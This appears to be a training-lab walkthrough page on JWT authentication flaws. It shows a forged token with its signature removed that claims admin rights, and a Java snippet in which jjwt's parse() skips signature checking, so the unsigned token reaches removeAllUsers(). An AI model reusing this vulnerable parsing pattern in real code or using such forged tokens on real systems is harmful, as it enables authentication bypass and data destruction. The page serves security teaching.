---
title: "A7: 2021 | JWT Tokens (9) | Cycubix Docs"
layout: default
nav_order: 9
parent: "A7: 2021 | JWT Tokens | Cycubix Docs"
grand_parent: "A7:2021 | Identity and Authentication Failure | Cycubix Docs"
---
# A7: 2021 | JWT Tokens (9) | Cycubix Docs

### Code review (2) <a href="#code_review_2" id="code_review_2"></a>

Same as before but now we are only removing the signature part, leaving the algorithm as is.

```
eyJhbGciOiJIUzI1NiJ9.ew0KICAiYWRtaW4iIDogdHJ1ZSwNCiAgImlhdCIgOiAxNTE2MjM5MDIyLA0KICAic3ViIiA6ICIxMjM0NTY3ODkwIiwNCiAgInVzZXIiIDogIkpvaG4gRG9lIg0KfQ.

{
  "alg" : "HS256"
},
{
  "admin" : true,
  "iat" : 1516239022,
  "sub" : "1234567890",
  "user" : "John Doe"
}
```

Using the following `parse` method we are still able to skip the signature check.

```
try {
   Jwt jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken);
   Claims claims = (Claims) jwt.getBody();
   String user = (String) claims.get("user");
   boolean isAdmin = Boolean.valueOf((String) claims.get("admin"));
   if (isAdmin) {
     removeAllUsers();
   } else {
     log.error("You are not an admin user");
   }
} catch (JwtException e) {
  throw new InvalidTokenException(e);
}
```
